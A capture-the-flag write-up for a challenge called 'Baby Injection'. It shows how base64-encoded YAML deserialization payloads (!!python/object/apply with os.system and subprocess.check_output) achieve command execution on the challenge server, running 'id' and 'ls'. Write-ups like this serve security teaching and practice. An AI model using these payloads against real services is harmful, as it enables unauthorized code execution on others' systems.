name : Baby Injection

Author : badhacker0x1

Des : Sometimes, seemingly harmless configuration files can do more than they appear. Can you uncover a hidden flaw and turn it to your advantage?

Solve : 
enter the url : 
http://172.105.121.246:5990/

First : 
see the endpoint base64 !! 

![image](https://github.com/user-attachments/assets/976e5bf2-164a-4229-b64e-98eaaaa4c628)


and decrypt it : 
![image](https://github.com/user-attachments/assets/895376f6-43ea-4188-9207-92e9260fefc9)

secoun : 
try yaml Injection

```
yaml: !!python/object/apply:os.system ["id"]
```
to base64 
```
eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbSBbImlkIl0=
```
![image](https://github.com/user-attachments/assets/9d9f13f1-d3e5-41fc-895e-3c19bfe33c39)

Ok !! try to see srting 

```
yaml: !!python/object/apply:subprocess.check_output [["id"]]
```
to base64 

```
eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0IFtbImlkIl1d
```

![image](https://github.com/user-attachments/assets/bbbfe718-f18e-43d3-b707-7ca9485a4b29)

Ok  Done !!!

try : 
```
yaml: !!python/object/apply:subprocess.check_output [["ls"]]
```
to Base64 : 
```
eWFtbDogISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0IFtbImxzIl1d
```
and the flag is : 

![image](https://github.com/user-attachments/assets/88dfd5c1-48d0-4846-b151-a13b95f44a76)

